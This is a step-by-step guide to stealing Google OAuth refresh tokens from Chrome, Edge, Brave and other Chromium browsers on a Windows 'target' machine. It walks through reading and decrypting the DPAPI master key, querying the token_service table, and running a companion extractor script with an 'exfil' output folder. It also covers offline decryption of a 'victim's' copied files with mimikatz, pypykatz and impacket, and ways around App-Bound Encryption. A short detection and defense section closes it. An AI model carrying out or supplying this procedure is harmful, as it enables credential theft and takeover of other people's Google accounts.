# Google OAuth Token Extraction — Windows Desktop Guide

> **Purpose:** Extract `1//...` Google OAuth refresh tokens from Chrome/Edge/Brave on a Windows machine.
> **Prerequisites:** Access to the target Windows desktop as the logged-in user (necessary for DPAPI decryption).

---

## 1. Where Tokens Live

Every Chromium browser stores OAuth tokens in a SQLite database called **Web Data**, one per browser profile:

| Browser | Path |
|---------|------|
| **Chrome** | `%LOCALAPPDATA%\Google\Chrome\User Data\<Profile>\Web Data` |
| **Edge** | `%LOCALAPPDATA%\Microsoft\Edge\User Data\<Profile>\Web Data` |
| **Brave** | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\<Profile>\Web Data` |
| **Vivaldi** | `%LOCALAPPDATA%\Vivaldi\User Data\<Profile>\Web Data` |
| **Yandex** | `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\<Profile>\Web Data` |
| **Opera** | `%APPDATA%\Opera Software\Opera Stable\Web Data` |

Profiles include `Default`, `Profile 1`, `Profile 3`, `Guest Profile`, etc. Each profile corresponds to a different browser user (and typically a different Google account).

> **Opera is the outlier:** it stores its profile under `%APPDATA%` (Roaming)
> rather than `%LOCALAPPDATA%`, and keeps the primary profile — and therefore
> `Web Data` — directly in the `Opera Stable` folder instead of a `Default\`
> subdirectory. `extract_tokens_windows.py` therefore scans the user-data root
> as well as the usual `Default` / `Profile N` subdirectories.

### The Database Table

```sql
-- Inside Web Data, the target table is: token_service
-- Columns on modern Chromium (Chrome/Edge/Brave 80+):
--   service             TEXT     (e.g. "https://accounts.google.com/OAuth2Login/GAIA_SID")
--   encrypted_token     BLOB     (AES-256-GCM, optional vXX prefix + 12B nonce + ciphertext + 16B tag)
--   binding_key         BLOB     (optional, token-binding key)
--   mtls_token_binding  INTEGER  (optional)
--
-- Older Chromium builds also shipped:
--   account_id          TEXT     (Gaia ID, e.g. "103683277444879361769")
--
-- `account_id` was removed upstream, so the extractor reads it when it is
-- present and otherwise parses the Gaia ID off the token itself
-- (token format: 1//[payload]:[GaiaID]).
```

Each row = one Google account's refresh token. Multiple rows per profile = multiple signed-in Google accounts.

---

## 2. The Encryption Chain

Chrome does NOT store tokens in plaintext. They are encrypted with a two-layer scheme:

### Layer 1: DPAPI (Windows Data Protection API)

Chrome's **master key** is stored in:

```
%LOCALAPPDATA%\Google\Chrome\User Data\Local State
```

This file is a JSON blob. The key is under `os_crypt.encrypted_key` — a base64 string with a `DPAPI` prefix (first 5 bytes).

The DPAPI wrapping ties the key to:
- The **logged-in Windows user's SID**
- The **Windows login password** (or a hash of it)
- The **machine's domain/workgroup context**

### Layer 2: App-Bound Encryption (Chrome 127+)

> **This is the layer DPAPI alone cannot defeat.**

Starting with **Chrome 127** (July 2024), Google added **App-Bound Encryption
(ABE)**. Instead of trusting *any* process running as the logged-in user, the
AES key is wrapped a second time by a privileged service that embeds the
requesting application's identity into the ciphertext and re-verifies it on
decrypt. Another program asking for the same key simply fails.

| Signal | Meaning |
|--------|---------|
| `os_crypt.app_bound_encrypted_key` in `Local State` | An ABE-wrapped key exists for this profile |
| Value prefixed `v20` | This value is ABE-protected — DPAPI will not open it |
| Value prefixed `v10` / `v11` | Classic scheme — still decrypts with the DPAPI key |
| Chrome **event ID 257** (Application log) | An ABE verification failure was logged |

Because ABE binds the key to the machine *and* the requesting app, running the
extractor as the logged-in user is **not** enough, and it breaks by design where
profiles roam between machines. Google's announcement states cookies were
migrated first, with passwords, payment data and "other persistent
authentication tokens" to follow — so whether `token_service` rows come back as
`v20` depends on the browser build.

`extract_tokens_windows.py` handles this explicitly: it warns when
`app_bound_encrypted_key` is present, still decrypts `v10` values with the
classic key, and reports `v20` rows as **"App-Bound Encrypted (v20) - skipped"**
instead of the misleading `MAC check failed` a blind `CryptUnprotectData`
attempt would otherwise produce.

> 📖 Background: [Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)

## 3. Extraction Steps (Live Access)

### Step 0: Close the browser or copy files

```batch
:: Option A: Kill the browser to release locks
taskkill /f /im chrome.exe

:: Option B: Copy Web Data while browser is running (Volume Shadow Copy or raw file copy)
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Web Data" C:\temp\web_data_copy.db
```

### Step 1: Read the master key from Local State

```batch
type "%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
```

Extract the `os_crypt.encrypted_key` value, base64-decode it, strip the 5-byte `DPAPI` prefix, and pass to `CryptUnprotectData`.

### Step 2: Query the Web Data database

```batch
sqlite3 "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Web Data"
sqlite> SELECT length(encrypted_token) FROM token_service WHERE service LIKE '%google%';
-- On Chromium builds that still have the account_id column:
-- sqlite> SELECT account_id, length(encrypted_token) FROM token_service WHERE service LIKE '%google%';
```

### Step 3: Decrypt each token with AES-256-GCM

The decrypted blob is the raw `1//...` refresh token string.

### Step 4: Output format

Each token is saved as a text file (one token per file) or collected into a single file with Gaia IDs.

---

## 4. The Extract Script

The companion Python script is at:

```
token_testing/extract_tokens_windows.py
```

**Usage on the target Windows machine:**

```batch
:: Install requirements first
pip install pycryptodome pywin32

:: Run the extractor (saves all tokens to output_tokens/)
python extract_tokens_windows.py

:: Extract all Chromium browsers at once
python extract_tokens_windows.py --all-browsers

:: Specify custom output directory
python extract_tokens_windows.py --output C:\exfil\tokens
```

**What the script does:**
1. Enumerates all Chrome profiles in `User Data`
2. Copies each `Web Data` to avoid SQLite locks
3. Reads and unwraps the DPAPI-encrypted master key from `Local State`
4. Queries `token_service` for all Google OAuth rows
5. AES-GCM decrypts each token
6. Saves each token to `token_<profile>_<gaia_id>.txt`
7. Also writes a summary file `all_tokens.txt` with all tokens in one place

---

## 5. Offline / Exfiltrated Extraction

If you have the victim's files but not live access to their machine:

### What you need

| File | Purpose |
|------|---------|
| `User Data\Local State` | Contains DPAPI-encrypted master key |
| `User Data\<Profile>\Web Data` | Contains encrypted tokens |
| `%APPDATA%\Microsoft\Protect\<SID>\*` | DPAPI master key files (3 files) |
| Victim's Windows login password | Required to decrypt DPAPI offline |

### Tools for offline decryption

| Tool | Command | Notes |
|------|---------|-------|
| **mimikatz** | `dpapi::chrome /in:"Web Data" /masterkey:...` | Needs the DPAPI masterkey or password |
| **pypykatz** | `pypykatz dpapi chrome --webdata Web Data --local-state Local State` | Python-based, works cross-platform |
| **Custom Python** | Use `win32crypt.CryptUnprotectData` on the actual machine | Only works on the victim's machine |

### The DPAPI Problem

The DPAPI master key files at `%APPDATA%\Microsoft\Protect\<SID>\` are encrypted with the user's Windows login password. To decrypt them offline:

```python
# Pseudocode for offline DPAPI decryption
from impacket.dpapi import DPAPI

# Load the user's DPAPI master key
with open("protect_file", "rb") as f:
    master_key_data = f.read()

# Decrypt with the victim's Windows password
master_key = DPAPI(master_key_data).decrypt_with_password(victim_password)
```

This requires the actual Windows password, not just a hash. NTLM hash won't work for DPAPI.

---

## 6. Common Failure Modes

| Symptom | Cause | Fix |
|---------|-------|-----|
| `?:` prefix in output | Corrupted Web Data or DB read failure | Use a different SQLite reader or VSS copy |
| `invalid_refresh_token` | Chrome/Google marked the token as invalid | User revoked it or signed out — unrecoverable |
| `fake-...` prefix | Browser test token, not a real Google token | Skip — stored when user chooses "Continue without signing in" |
| DPAPI: `Key not found` | Running as a different Windows user | Must run as the same user that owns the Chrome profile |
| DPAPI: `Bad data` | Wrong `Local State` file or corrupted | Check `encrypted_key` is valid base64 and starts with `DPAPI` prefix |
| AES-GCM: `MAC check failed` | Wrong master key, corrupted ciphertext, or Chrome version mismatch | Verify master key is 32 bytes after unwrapping |
| `App-Bound Encrypted (v20) - skipped` | Value is protected by App-Bound Encryption (Chrome 127+) | Not defeatable with DPAPI — needs the browser's elevation service. Target an older build, or accept the loss. |
| `App-Bound Encryption present` (warning only) | `Local State` carries `app_bound_encrypted_key` | Informational: `v10` rows still extract; only `v20` rows are skipped |

---

## 7. Detection & Defense

### How users can detect this

1. **Google Security Checkup**: `https://myaccount.google.com/security-checkup` — shows all devices with active sessions
2. **Chrome sign-in notifications**: Google sends email alerts for new device sign-ins
3. **Infostealer indicators**: High CPU, network connections to unknown IPs, browser crashes

### How to protect

1. **Use Chrome's "Sign out of all sessions"** — immediately revokes all refresh tokens
2. **Change Google password** — invalidates all existing tokens (with some exceptions)
3. **Check connected apps** at `https://myaccount.google.com/permissions` — remove unknown apps
4. **Enable Advanced Protection** — hardware security keys make token theft nearly useless

---

*Reference: Chrome Internals documentation, Chromium source code (components/signin/public/base/persistent_rehash_encryptor_win.cc), and practical analysis of infostealer output format.*